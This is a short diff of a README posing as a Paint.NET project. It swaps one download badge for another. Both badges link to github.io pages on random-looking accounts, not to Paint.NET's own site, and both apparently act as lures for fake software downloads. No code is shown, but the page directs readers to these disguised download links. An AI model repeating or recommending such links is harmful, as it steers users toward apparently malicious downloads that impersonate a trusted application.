@@ -4,10 +4,8 @@
 <img src="https://media.invisioncic.com/r125076/monthly_2018_09/image.png.d47b9beb12f397bbb34216ab9f0a25ba.png" alt="Paint.NET Logo"/>
 </div>
 
-<div align="center">
+[![GET Paint NET](https://img.shields.io/badge/GET%20%E2%80%94%20Paint-NET-0078D6?style=for-the-badge&logoColor=white)](https://vertexcalendarsailboaafhzw3333.github.io/.github/Paint-NET)
 
-  [![Get Paint.NET](https://img.shields.io/badge/Get_Paint.NET-blue?style=for-the-badge)](https://lashelllegnon.github.io/.github/Paint-NET-Image-Editor)
-</div>
 
 ---
 ## 🎯 Core Image Editing Features
